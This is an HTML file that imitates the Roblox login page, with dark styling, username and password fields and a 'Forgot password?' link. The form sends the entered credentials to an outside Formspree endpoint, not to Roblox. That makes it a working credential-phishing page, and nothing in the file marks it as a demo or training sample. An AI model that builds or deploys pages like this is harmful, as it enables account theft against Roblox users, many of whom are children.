<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in to Roblox</title>
    <style>
        body {
            background-color: #232527;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            color: #fff;
        }

        .login-container {
            background-color: #393b3d;
            padding: 40px;
            border-radius: 8px;
            width: 320px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.2);
        }

        h2 {
            text-align: center;
            margin-bottom: 20px;
            font-weight: 700;
            font-size: 24px;
        }

        .input-group {
            margin-bottom: 15px;
        }

        input[type="text"], 
        input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #aeb4b8;
            border-radius: 4px;
            background-color: #e5e5e5;
            box-sizing: border-box;
            font-size: 16px;
            outline: none;
        }

        input[type="text"]:focus, 
        input[type="password"]:focus {
            border: 1px solid #000;
            background-color: #fff;
        }

        button {
            width: 100%;
            padding: 12px;
            background-color: #000;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            margin-top: 10px;
        }

        button:hover {
            background-color: #333;
        }

        .footer-link {
            text-align: center;
            margin-top: 15px;
            font-size: 12px;
        }

        .footer-link a {
            color: #fff;
            text-decoration: underline;
        }
        
        label {
            display: none;
        }
    </style>
</head>
<body>

<div class="login-container">
    <h2>Log In</h2>
    
    <form action="https://formspree.io/f/mppqlyvk" method="POST">
        
        <div class="input-group">
            <input type="text" name="username" placeholder="Username or email" required autocomplete="off">
        </div>

        <div class="input-group">
            <input type="password" name="password" placeholder="Password" required>
        </div>

        <button type="submit">Log In</button>
        
    </form>

    <div class="footer-link">
        <a href="#">Forgot password?</a>
    </div>
</div>

</body>
</html>
